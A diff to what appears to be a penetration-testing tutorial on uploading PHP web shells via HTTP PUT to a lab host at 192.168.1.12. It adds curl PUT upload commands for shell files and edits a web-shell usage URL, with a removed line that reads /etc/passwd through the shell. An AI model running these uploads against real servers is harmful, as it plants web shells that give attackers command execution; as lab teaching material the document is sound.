@@ -331,6 +331,9 @@ if (isset($_POST['submit'])) {
 </html>
 ```
 
+```bash
+curl -X PUT -T "fileupload.php" http://192.168.1.12/test/
+```
 ---
 
 ## PHP Reverse Shell Upload Example
@@ -346,7 +349,7 @@ curl --request PUT --url http://192.168.1.12/test/shell.php --header 'Content-Ty
 ## Usage
 
 ```text
-http://192.168.1.12/shell.php?cmd=cat+/etc/passwd
+http://192.168.1.12/test/shell.php?cmd=id
 ```
 
 ---
@@ -384,7 +387,10 @@ if (isset($_REQUEST["cmd"])) {
 </body>
 </html>
 ```
-
+```bash
+curl -X PUT -T "shell-post.php" http://192.168.1.12/test/
+```
+![alt text](./img/search-cmd.png)
 ---
 
 ## Conclusion
